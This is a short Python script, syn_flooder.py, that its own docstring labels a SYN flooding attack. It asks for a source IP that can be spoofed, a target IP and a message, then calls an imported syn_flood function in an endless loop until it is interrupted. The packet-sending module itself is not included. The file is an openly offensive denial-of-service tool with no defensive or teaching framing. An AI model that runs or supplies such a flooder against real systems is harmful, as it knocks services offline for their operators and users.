#!/usr/bin/env python3
"""
syn_flooder.py: SYN Flooding attack

"""

import syn_flooding as syn_flooding
#TODO import threading

source_ip = input("Source IP: ")
target_ip = input("Enter target IP: ")
message = input("Enter message: ")

try:
	while True:
		syn_flooding.syn_flood(source_ip, target_ip, message)
except KeyboardInterrupt:
	print("\n[+] Exiting...")	# Exit message
	exit()
except Exception as e:
	print("[-] Error: " + str(e))	# Error message